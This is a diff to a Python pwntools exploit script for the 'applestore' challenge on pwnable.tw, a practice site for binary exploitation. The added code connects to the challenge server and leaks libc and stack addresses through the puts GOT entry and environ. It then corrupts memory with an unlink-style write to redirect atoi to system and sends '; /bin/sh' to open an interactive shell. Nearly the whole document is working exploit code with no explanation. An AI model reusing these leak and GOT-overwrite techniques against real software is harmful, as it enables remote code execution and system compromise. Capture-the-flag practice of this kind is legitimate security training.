@@ -1,30 +1,39 @@
 from pwn import *
 
-io = process('./applestore')
-context.terminal = ['tmux']
+BEDUG = False
+
+if BEDUG==True:
+	io = process('./applestore')
+	libc = ELF('/lib/i386-linux-gnu/libc.so.6')
+else:
+	io = remote('chall.pwnable.tw', 10104)
+	libc = ELF('./libc_32.so.6')
+
+elf = ELF('./applestore')
+#context.terminal = ['tmux']
 
 def add(product):
-	print(io.recvuntil('> '))
-	io.sendline('2')
-	print(io.recvuntil('> '))
+	print(io.recvuntil(b'> '))
+	io.sendline(b'2')
+	print(io.recvuntil(b'> '))
 	io.sendline(str(product))
 
 def checkout():
-	print(io.recvuntil('> '))
-	io.sendline('5')
-	print(io.recvuntil('> '))
-	io.sendline('y')
+	print(io.recvuntil(b'> '))
+	io.sendline(b'5')
+	print(io.recvuntil(b'> '))
+	io.sendline(b'y')
 
-def cart():
-	print(io.recvuntil('> '))
-	io.sendline('4')
-	print(io.recvuntil('> '))
-	io.sendline('y')
+def cart(payload):
+	print(io.recvuntil(b'> '))
+	io.sendline(b'4')
+	print(io.recvuntil(b'> '))
+	io.sendline(payload)
 
 def delete(product):
-	print(io.recvuntil('> '))
-	io.sendline('3')
-	print(io.recvuntil('> '))
+	print(io.recvuntil(b'> '))
+	io.sendline(b'3')
+	print(io.recvuntil(b'> '))
 	io.sendline(str(product))
 
 '''
@@ -50,21 +59,38 @@ for i in range(10):
 for j in range(16):
 	add(5)
 
+#pause()
 
-pause()
 checkout()
 
+payload = b'yy'+p32(elf.got['puts'])+p32(0) * 3
 
+cart(payload)
 
-delete(27)
+print(io.recvuntil('\n27: '))
+libc.address = u32(io.recv(4)) - libc.sym['puts']
 
-delete(26)
+payload = b'yy'+p32(libc.sym['environ'])+p32(0) * 3
+cart(payload)
+print(io.recvuntil('\n27: '))
+stack = u32(io.recv(4)) - 0x124
+ebp = stack + 0x20
+#fd = stack + 0x4 - 0xc
+#bk = elf.got['atoi'] - 0x8
 
-pause()
+bk = ebp - 0x8
+fd = elf.got['atoi'] + 0x22
 
-add(2)
+payload = b'27'
+payload += p32(stack+0x78)
+payload += p32(libc.sym['system'])
+payload += p32(fd)
+payload += p32(bk)
 
-cart()
-
-
-print(io.recvall())
+payload = payload.decode('ISO-8859-1')
+#cart(payload)
+delete(payload)
+print(io.recvuntil(b'> '))
+payload = p32(libc.sym['system']) + b'; /bin/sh'
+io.sendline(payload)
+io.interactive()
